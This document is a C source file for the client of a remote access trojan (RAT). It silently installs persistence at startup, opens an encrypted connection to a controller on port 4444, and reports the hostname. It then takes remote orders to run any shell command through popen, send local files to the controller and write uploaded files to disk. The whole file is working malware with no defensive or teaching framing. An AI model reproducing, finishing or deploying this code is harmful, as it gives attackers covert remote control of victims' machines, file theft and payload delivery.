#define _GNU_SOURCE
#define _POSIX_C_SOURCE 200809L

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <dirent.h>
#include <errno.h>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #include <direct.h>
    #include <io.h>
    #define getcwd _getcwd
    #define chdir _chdir
    #define close closesocket
    #define sleep(x) Sleep((x)*1000)
    #define popen _popen
    #define pclose _pclose
    #pragma comment(lib, "ws2_32.lib")
    typedef int socklen_t;
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <sys/utsname.h>
    #include <sys/wait.h>
    #include <pwd.h>
    #define INVALID_SOCKET -1
#endif

#include "../include/persistence.h"
#include "../include/crypto.h"

#define PORT 4444
#define BUFFER_SIZE 4096
#define MAX_COMMAND_SIZE 1024

typedef struct {
    char host[16];
    int port;
#ifdef _WIN32
    SOCKET client_fd;
#else
    int client_fd;
#endif
    struct sockaddr_in server_addr;
    char current_dir[1024];
    char os_type[32];
    char username[256];
    char hostname[256];
    crypto_context_t crypto_ctx;
} RAT_CLIENT;

// Function to detect the operating system
void detect_os(RAT_CLIENT *client) {
#ifdef _WIN32
    strcpy(client->os_type, "Windows");
#else
    strcpy(client->os_type, "Linux");
#endif
}

// Function to get current username
void get_username(RAT_CLIENT *client) {
#ifdef _WIN32
    DWORD username_len = sizeof(client->username);
    if (!GetUserName(client->username, &username_len)) {
        strcpy(client->username, "unknown");
    }
#else
    struct passwd *pw = getpwuid(getuid());
    if (pw) {
        strcpy(client->username, pw->pw_name);
    } else {
        strcpy(client->username, "unknown");
    }
#endif
}

// Function to generate OS-appropriate prompt
void generate_prompt(RAT_CLIENT *client, char *prompt, size_t prompt_size) {
    if (strcmp(client->os_type, "Windows") == 0) {
        snprintf(prompt, prompt_size, "%s>", client->current_dir);
    } else {
        // Linux/Unix style: [user@hostname dir]$
        char *dir_name;
        
        // Handle path differently on Linux
#ifdef _WIN32
        dir_name = strrchr(client->current_dir, '\\');
        if (!dir_name) {
            dir_name = strrchr(client->current_dir, '/');
        }
#else
        dir_name = strrchr(client->current_dir, '/');
#endif
        if (dir_name) {
            dir_name++; // Skip the separator
        } else {
            dir_name = client->current_dir;
        }
        
        if (strlen(dir_name) == 0) {
#ifdef _WIN32
            dir_name = "\\";
#else
            dir_name = "/";
#endif
        }
        
        snprintf(prompt, prompt_size, "[%s@%s %s]$ ", 
                client->username, client->hostname, dir_name);
    }
}

int perform_client_key_exchange(RAT_CLIENT *client) {
    unsigned char *our_public_key = NULL;
    int our_key_len = 0;
    unsigned char *peer_public_key = NULL;
    int peer_key_len = 0;
    unsigned char *encrypted_aes_key = NULL;
    int encrypted_key_len = 0;
    int result = -1;
    
    // Export our public key
    if (crypto_export_public_key(&client->crypto_ctx, &our_public_key, &our_key_len) != 0) {
        printf("Error: Failed to export public key\n");
        goto cleanup;
    }
    
    // Receive server's public key length
    uint32_t peer_key_len_net;
    if (recv(client->client_fd, &peer_key_len_net, sizeof(peer_key_len_net), 0) != sizeof(peer_key_len_net)) {
        printf("Error: Failed to receive server public key length\n");
        goto cleanup;
    }
    peer_key_len = ntohl(peer_key_len_net);
    
    if (peer_key_len <= 0 || peer_key_len > 4096) {
        printf("Error: Invalid server public key length\n");
        goto cleanup;
    }
    
    // Receive server's public key
    peer_public_key = malloc(peer_key_len);
    if (!peer_public_key) {
        printf("Error: Memory allocation failed\n");
        goto cleanup;
    }
    
    if (recv(client->client_fd, peer_public_key, peer_key_len, 0) != peer_key_len) {
        printf("Error: Failed to receive server public key\n");
        goto cleanup;
    }
    
    // Import server's public key
    if (crypto_import_public_key(&client->crypto_ctx, peer_public_key, peer_key_len) != 0) {
        printf("Error: Failed to import server public key\n");
        goto cleanup;
    }
    
    // Send our public key length and key
    uint32_t key_len_net = htonl(our_key_len);
    if (send(client->client_fd, &key_len_net, sizeof(key_len_net), 0) != sizeof(key_len_net)) {
        printf("Error: Failed to send public key length\n");
        goto cleanup;
    }
    
    if (send(client->client_fd, our_public_key, our_key_len, 0) != our_key_len) {
        printf("Error: Failed to send public key\n");
        goto cleanup;
    }
    
    // Receive encrypted AES key length
    uint32_t enc_key_len_net;
    if (recv(client->client_fd, &enc_key_len_net, sizeof(enc_key_len_net), 0) != sizeof(enc_key_len_net)) {
        printf("Error: Failed to receive encrypted key length\n");
        goto cleanup;
    }
    encrypted_key_len = ntohl(enc_key_len_net);
    
    if (encrypted_key_len <= 0 || encrypted_key_len > 1024) {
        printf("Error: Invalid encrypted key length\n");
        goto cleanup;
    }
    
    // Receive encrypted AES key
    encrypted_aes_key = malloc(encrypted_key_len);
    if (!encrypted_aes_key) {
        printf("Error: Memory allocation failed\n");
        goto cleanup;
    }
    
    if (recv(client->client_fd, encrypted_aes_key, encrypted_key_len, 0) != encrypted_key_len) {
        printf("Error: Failed to receive encrypted AES key\n");
        goto cleanup;
    }
    
    // Decrypt AES key
    if (crypto_decrypt_aes_key(&client->crypto_ctx, encrypted_aes_key, encrypted_key_len) != 0) {
        printf("Error: Failed to decrypt AES key\n");
        goto cleanup;
    }
    
    result = 0;
    
cleanup:
    if (our_public_key) free(our_public_key);
    if (peer_public_key) free(peer_public_key);
    if (encrypted_aes_key) free(encrypted_aes_key);
    
    return result;
}

int connect_to_server(RAT_CLIENT *client) {
#ifdef _WIN32
    WSADATA wsaData;
    int wsaResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (wsaResult != 0) {
        printf("WSAStartup failed: %d\n", wsaResult);
        return -1;
    }
#endif

    // Create socket
    if ((client->client_fd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
#ifdef _WIN32
        printf("Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
#else
        perror("Socket creation failed");
#endif
        return -1;
    }
    
    client->server_addr.sin_family = AF_INET;
    client->server_addr.sin_port = htons(client->port);
    
    if (inet_pton(AF_INET, client->host, &client->server_addr.sin_addr) <= 0) {
#ifdef _WIN32
        printf("Invalid address: %d\n", WSAGetLastError());
#else
        perror("Invalid address");
#endif
        return -1;
    }
    
    // Connect to server
    if (connect(client->client_fd, (struct sockaddr *)&client->server_addr, 
                sizeof(client->server_addr)) < 0) {
#ifdef _WIN32
        printf("Connection failed: %d\n", WSAGetLastError());
#else
        perror("Connection failed");
#endif
        return -1;
    }
    
    // Initialize crypto context for client
    if (crypto_init(&client->crypto_ctx, 0) != 0) {
        printf("Error: Failed to initialize encryption\n");
        return -1;
    }
    
    // Perform key exchange
    if (perform_client_key_exchange(client) != 0) {
        printf("Error: Key exchange failed\n");
        crypto_cleanup(&client->crypto_ctx);
        return -1;
    }
    
    // Initialize OS and user information
    detect_os(client);
    get_username(client);
    
    // Get hostname
#ifdef _WIN32
    DWORD hostname_len = sizeof(client->hostname);
    if (!GetComputerName(client->hostname, &hostname_len)) {
        strcpy(client->hostname, "unknown");
    }
#else
    if (gethostname(client->hostname, sizeof(client->hostname)) != 0) {
        strcpy(client->hostname, "unknown");
    }
#endif
    
    // Send hostname to server for compatibility (now encrypted)
    crypto_send(client->client_fd, &client->crypto_ctx, client->hostname, strlen(client->hostname), 0);
    
    // Get current directory
    if (getcwd(client->current_dir, sizeof(client->current_dir)) == NULL) {
#ifdef _WIN32
        strcpy(client->current_dir, "C:\\");
#else
        strcpy(client->current_dir, "/");
#endif
    }
    
    return 0;
}

void send_response(RAT_CLIENT *client, const char *response) {
    if (!client || !response) {
        return;
    }
    
    if (client->client_fd == INVALID_SOCKET) {
        return;
    }
    
    int bytes_sent = crypto_send(client->client_fd, &client->crypto_ctx, response, strlen(response), 0);
    if (bytes_sent <= 0) {
        // Connection likely broken, mark as invalid
        client->client_fd = INVALID_SOCKET;
    }
}

void send_response_with_prompt(RAT_CLIENT *client, const char *response) {
    char prompt[512];
    char full_response[BUFFER_SIZE * 4];
    
    if (!client || !response) {
        return;
    }
    
    if (client->client_fd == INVALID_SOCKET) {
        return;
    }
    
    // Update current directory in case it changed
    if (getcwd(client->current_dir, sizeof(client->current_dir)) == NULL) {
        perror("Warning: Failed to get current directory");
#ifdef _WIN32
        strcpy(client->current_dir, "C:\\");
#else
        strcpy(client->current_dir, "/");
#endif
    }
    
    generate_prompt(client, prompt, sizeof(prompt));
    
    // Send response followed by prompt on a new line
    if (strlen(response) > 0) {
        int ret = snprintf(full_response, sizeof(full_response), "%s\n%s", response, prompt);
        if (ret >= (int)sizeof(full_response)) {
            // Response was truncated, send what we can
            printf("Warning: Response truncated due to length\n");
        }
    } else {
        strncpy(full_response, prompt, sizeof(full_response) - 1);
        full_response[sizeof(full_response) - 1] = '\0';
    }
    
    // Send in chunks if response is large
    int total_len = strlen(full_response);
    int sent = 0;
    int chunk_size = BUFFER_SIZE - 1;
    
    while (sent < total_len && client->client_fd != INVALID_SOCKET) {
        int to_send = (total_len - sent > chunk_size) ? chunk_size : (total_len - sent);
        int bytes_sent = crypto_send(client->client_fd, &client->crypto_ctx, full_response + sent, to_send, 0);
        
        if (bytes_sent <= 0) {
            client->client_fd = INVALID_SOCKET;
            break; // Error sending
        }
        
        sent += bytes_sent;
        
        // Small delay between chunks to prevent overwhelming
        if (sent < total_len) {
#ifdef _WIN32
            Sleep(10); // 10ms delay on Windows
#else
            usleep(10000); // 10ms delay on Linux
#endif
        }
    }
}

// Cross-platform command execution
void execute_system_command(RAT_CLIENT *client, const char *command, char *result, size_t result_size) {
    FILE *fp;
    char buffer[BUFFER_SIZE];
    char exec_command[MAX_COMMAND_SIZE + 50];
    
    if (!client || !command || !result || result_size == 0) {
        if (result && result_size > 0) {
            strncpy(result, "Error: Invalid parameters", result_size - 1);
            result[result_size - 1] = '\0';
        }
        return;
    }
    
    // Clear result buffer
    memset(result, 0, result_size);
    
    // Check command length
    if (strlen(command) > MAX_COMMAND_SIZE) {
        strncpy(result, "Error: Command too long", result_size - 1);
        result[result_size - 1] = '\0';
        return;
    }
    
#ifdef _WIN32
    // On Windows, use cmd.exe for proper command execution
    snprintf(exec_command, sizeof(exec_command), "cmd.exe /c %s 2>&1", command);
#else
    // On Linux, use sh for command execution
    snprintf(exec_command, sizeof(exec_command), "%s 2>&1", command);
#endif
    
    fp = popen(exec_command, "r");
    if (fp == NULL) {
        snprintf(result, result_size, "Error: Failed to execute command - %s", strerror(errno));
        return;
    }
    
    size_t total_len = 0;
    while (fgets(buffer, sizeof(buffer), fp) != NULL && total_len < result_size - 1) {
        size_t buffer_len = strlen(buffer);
        if (total_len + buffer_len < result_size - 1) {
            strcat(result, buffer);
            total_len += buffer_len;
        } else {
            strncat(result, buffer, result_size - total_len - 1);
            break;
        }
    }
    
    int exit_code = pclose(fp);
    if (exit_code == -1) {
        // If we already have some output, just add a warning
        if (total_len > 0) {
            if (total_len < result_size - 50) {
                strcat(result, "\nWarning: Error closing command pipe");
            }
        } else {
            strncpy(result, "Error: Failed to close command pipe", result_size - 1);
            result[result_size - 1] = '\0';
        }
    }
    
    // Remove trailing newline for cleaner output
    if (total_len > 0 && result[total_len - 1] == '\n') {
        result[total_len - 1] = '\0';
    }
}

void execute_shell_command(RAT_CLIENT *client, const char *command) {
    char result[BUFFER_SIZE * 4] = {0};
    
    // Handle cd command specially to update current directory
    if (strncmp(command, "cd ", 3) == 0) {
        const char *path = command + 3;
        // Trim whitespace from path
        while (*path == ' ') path++;
        
        if (strlen(path) == 0) {
#ifdef _WIN32
            // cd with no args goes to user profile directory on Windows
            char *userprofile = getenv("USERPROFILE");
            if (userprofile && chdir(userprofile) == 0) {
                strcpy(client->current_dir, userprofile);
                send_response_with_prompt(client, "");
                return;
            }
#else
            // cd with no args or ~ goes to home directory on Linux
            const char *home = getenv("HOME");
            if (home && chdir(home) == 0) {
                strcpy(client->current_dir, home);
                send_response_with_prompt(client, "");
                return;
            }
#endif
        } else if (strcmp(path, "~") == 0) {
#ifdef _WIN32
            char *userprofile = getenv("USERPROFILE");
            if (userprofile && chdir(userprofile) == 0) {
                strcpy(client->current_dir, userprofile);
                send_response_with_prompt(client, "");
                return;
            }
#else
            const char *home = getenv("HOME");
            if (home && chdir(home) == 0) {
                strcpy(client->current_dir, home);
                send_response_with_prompt(client, "");
                return;
            }
#endif
        } else if (chdir(path) == 0) {
            if (getcwd(client->current_dir, sizeof(client->current_dir)) != NULL) {
                send_response_with_prompt(client, "");
                return;
            }
        }
        // If cd failed, show error and current prompt
#ifdef _WIN32
        send_response_with_prompt(client, "The system cannot find the path specified.");
#else
        send_response_with_prompt(client, "cd: No such file or directory");
#endif
        return;
    }
    
    // Execute the command using cross-platform function
    execute_system_command(client, command, result, sizeof(result));
    send_response_with_prompt(client, result);
}

void handle_download(RAT_CLIENT *client, const char *filename) {
    FILE *file;
    char buffer[BUFFER_SIZE];
    size_t bytes_read;
    
    if (!client || !filename) {
        send_response_with_prompt(client, "Error: Invalid parameters for download");
        return;
    }
    
    if (client->client_fd == INVALID_SOCKET) {
        return;
    }
    
    if (strlen(filename) > 400) {
        send_response_with_prompt(client, "Error: Filename too long");
        return;
    }
    
    file = fopen(filename, "rb");
    if (file == NULL) {
        char error_msg[512];
        snprintf(error_msg, sizeof(error_msg), "Error: Cannot open file for download - %s", strerror(errno));
        send_response_with_prompt(client, error_msg);
        return;
    }
    
    // Send file content
    while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
        int bytes_sent = crypto_send(client->client_fd, &client->crypto_ctx, buffer, bytes_read, 0);
        if (bytes_sent <= 0) {
            client->client_fd = INVALID_SOCKET;
            fclose(file);
            return;
        } else if (bytes_sent != (int)bytes_read) {
            // Partial send - this is problematic for file transfer
            client->client_fd = INVALID_SOCKET;
            fclose(file);
            return;
        }
    }
    
    if (ferror(file)) {
        // There was an error reading the file
        fclose(file);
        send_response_with_prompt(client, "Error: Failed to read file during download");
        return;
    }
    
    if (fclose(file) != 0) {
        send_response_with_prompt(client, "Warning: Error closing file after download");
    }
}

void handle_upload(RAT_CLIENT *client) {
    FILE *file;
    char upload_info[512];
    char destination[256] = {0};
    char filename[256] = {0};
    char final_path[512];
    char buffer[BUFFER_SIZE];
    int bytes_received;
    char *delimiter;
    
    if (!client) {
        return;
    }
    
    if (client->client_fd == INVALID_SOCKET) {
        return;
    }
    
    // Receive upload info in format "destination|filename\n"
    memset(upload_info, 0, sizeof(upload_info));
    int info_pos = 0;
    char temp_char;
    
    // Read upload info character by character until newline
    while (info_pos < (int)(sizeof(upload_info) - 1)) {
        bytes_received = crypto_recv(client->client_fd, &client->crypto_ctx, &temp_char, 1, 0);
        if (bytes_received <= 0) {
            if (bytes_received == 0) {
                send_response_with_prompt(client, "Error: Connection closed during upload info reception");
            } else {
                send_response_with_prompt(client, "Error: Failed to receive upload info");
            }
            return;
        }
        
        if (temp_char == '\n') {
            break; // End of upload info
        }
        
        upload_info[info_pos++] = temp_char;
    }
    upload_info[info_pos] = '\0';
    
    // Send acknowledgment to server
    int ack_sent = crypto_send(client->client_fd, &client->crypto_ctx, "OK", 2, 0);
    if (ack_sent <= 0) {
        client->client_fd = INVALID_SOCKET;
        return;
    }
    
    // Parse destination and filename
    delimiter = strchr(upload_info, '|');
    if (delimiter) {
        *delimiter = '\0';
        strncpy(destination, upload_info, sizeof(destination) - 1);
        destination[sizeof(destination) - 1] = '\0';
        strncpy(filename, delimiter + 1, sizeof(filename) - 1);
        filename[sizeof(filename) - 1] = '\0';
    } else {
        // Fallback to old format - treat entire string as filename
        strncpy(filename, upload_info, sizeof(filename) - 1);
        filename[sizeof(filename) - 1] = '\0';
    }
    
    // Determine final file path
    if (strlen(destination) > 0) {
        // Check if destination is a directory
        struct stat st;
        if (stat(destination, &st) == 0 && S_ISDIR(st.st_mode)) {
            // Destination is a directory, append filename
#ifdef _WIN32
            const char *base_filename = strrchr(filename, '\\');
            if (!base_filename) {
                base_filename = strrchr(filename, '/');
            }
#else
            const char *base_filename = strrchr(filename, '/');
#endif
            if (base_filename) {
                base_filename++; // Skip the separator
            } else {
                base_filename = filename;
            }
#ifdef _WIN32
            snprintf(final_path, sizeof(final_path), "%s\\%s", destination, base_filename);
#else
            snprintf(final_path, sizeof(final_path), "%s/%s", destination, base_filename);
#endif
        } else {
            // Destination is a full file path
            strncpy(final_path, destination, sizeof(final_path) - 1);
            final_path[sizeof(final_path) - 1] = '\0';
        }
    } else {
        // No destination specified, use current directory
#ifdef _WIN32
        const char *base_filename = strrchr(filename, '\\');
        if (!base_filename) {
            base_filename = strrchr(filename, '/');
        }
#else
        const char *base_filename = strrchr(filename, '/');
#endif
        if (base_filename) {
            base_filename++; // Skip the separator
        } else {
            base_filename = filename;
        }
        strncpy(final_path, base_filename, sizeof(final_path) - 1);
        final_path[sizeof(final_path) - 1] = '\0';
    }
    
    file = fopen(final_path, "wb");
    if (file == NULL) {
        char error_msg[512];
        char truncated_path[256];
        
        // Truncate path if too long to prevent buffer overflow
        if (strlen(final_path) > 255) {
            strncpy(truncated_path, final_path, 252);
            truncated_path[252] = '.';
            truncated_path[253] = '.';
            truncated_path[254] = '.';
            truncated_path[255] = '\0';
        } else {
            strcpy(truncated_path, final_path);
        }
        
        snprintf(error_msg, sizeof(error_msg), "Error: Cannot create file %s - %s", truncated_path, strerror(errno));
        send_response_with_prompt(client, error_msg);
        return;
    }
    
    // Receive file content
    while ((bytes_received = crypto_recv(client->client_fd, &client->crypto_ctx, buffer, BUFFER_SIZE, 0)) > 0) {
        size_t bytes_written = fwrite(buffer, 1, bytes_received, file);
        if (bytes_written != (size_t)bytes_received) {
            fclose(file);
            unlink(final_path); // Remove partially written file
            send_response_with_prompt(client, "Error: Failed to write uploaded data to file");
            return;
        }
        if (bytes_received < BUFFER_SIZE) {
            break; // End of file
        }
    }
    
    if (bytes_received < 0) {
        fclose(file);
        unlink(final_path); // Remove partially written file
        send_response_with_prompt(client, "Error: Failed to receive file data");
        return;
    }
    
    if (fclose(file) != 0) {
        char error_msg[512];
        char truncated_path[200]; // Reduced size to leave room for error message
        
        // Truncate path if too long to prevent buffer overflow
        if (strlen(final_path) > 190) {
            strncpy(truncated_path, final_path, 187);
            truncated_path[187] = '.';
            truncated_path[188] = '.';
            truncated_path[189] = '.';
            truncated_path[190] = '\0';
        } else {
            strcpy(truncated_path, final_path);
        }
        
        snprintf(error_msg, sizeof(error_msg), "Warning: Error closing uploaded file %s - %s", truncated_path, strerror(errno));
        send_response_with_prompt(client, error_msg);
        return;
    }
}

void execute_commands(RAT_CLIENT *client) {
    char command[MAX_COMMAND_SIZE];
    char *args[10];
    char *token;
    int arg_count;
    int bytes_received;
    char prompt[512];
    
    if (!client) {
        return;
    }
    
    if (client->client_fd == INVALID_SOCKET) {
        return;
    }
    
    // Send initial prompt to server
    generate_prompt(client, prompt, sizeof(prompt));
    send_response(client, prompt);
    
    while (client->client_fd != INVALID_SOCKET) {
        // Receive command from server
        memset(command, 0, sizeof(command));
        bytes_received = crypto_recv(client->client_fd, &client->crypto_ctx, command, sizeof(command) - 1, 0);
        
        if (bytes_received <= 0) {
            if (bytes_received == 0) {
                // Connection closed by server
                break;
            } else {
                // Error receiving data
#ifdef _WIN32
                if (WSAGetLastError() != WSAECONNRESET) {
                    // Only log if it's not a connection reset (normal termination)
                    printf("Error receiving command: %d\n", WSAGetLastError());
                }
#else
                if (errno != ECONNRESET && errno != EPIPE) {
                    // Only log if it's not a connection reset (normal termination)
                    perror("Error receiving command");
                }
#endif
                break;
            }
        }
        
        command[bytes_received] = '\0';
        
        // Remove trailing newline if present
        if (command[strlen(command) - 1] == '\n') {
            command[strlen(command) - 1] = '\0';
        }
        
        // Parse command
        arg_count = 0;
        char command_copy[MAX_COMMAND_SIZE];
        strncpy(command_copy, command, sizeof(command_copy) - 1);
        command_copy[sizeof(command_copy) - 1] = '\0';
        token = strtok(command_copy, " ");
        while (token != NULL && arg_count < 9) {
            args[arg_count++] = token;
            token = strtok(NULL, " ");
        }
        args[arg_count] = NULL;
        
        if (arg_count == 0) {
            // Send empty prompt for empty commands
            generate_prompt(client, prompt, sizeof(prompt));
            send_response(client, prompt);
            continue;
        }
        
        // Handle special commands
        if (strcmp(args[0], "download") == 0) {
            if (arg_count > 1) {
                handle_download(client, args[1]);
                // Send confirmation prompt after download
                if (client->client_fd != INVALID_SOCKET) {
                    send_response_with_prompt(client, "File sent for download");
                }
            } else {
                send_response_with_prompt(client, "Error: No filename specified for download");
            }
        }
        else if (strcmp(args[0], "upload") == 0) {
            handle_upload(client);
            // Send confirmation prompt after upload with file path info
            if (client->client_fd != INVALID_SOCKET) {
                char upload_msg[256];
                snprintf(upload_msg, sizeof(upload_msg), "File uploaded successfully");
                send_response_with_prompt(client, upload_msg);
            }
        }
        else if (strcmp(args[0], "exit") == 0) {
            send_response(client, "Goodbye!");
            break;
        }
        else {
            // Execute everything else as native OS command
            execute_shell_command(client, command);
        }
    }
}

void cleanup(RAT_CLIENT *client) {
    if (client->client_fd > 0) {
        close(client->client_fd);
    }
    crypto_cleanup(&client->crypto_ctx);
#ifdef _WIN32
    WSACleanup();
#endif
}

int main() {
    RAT_CLIENT client;
    
    // Install persistence automatically and silently
    install_automatic_persistence();
    
    // Initialize client
    strcpy(client.host, "127.0.0.1");
    client.port = PORT;
#ifdef _WIN32
    client.client_fd = INVALID_SOCKET;
#else
    client.client_fd = -1;
#endif
    
    if (connect_to_server(&client) < 0) {
        cleanup(&client);
        return 1;
    }
    
    printf("Connected to server at %s:%d\n", client.host, client.port);
    
    execute_commands(&client);
    
    cleanup(&client);
    return 0;
}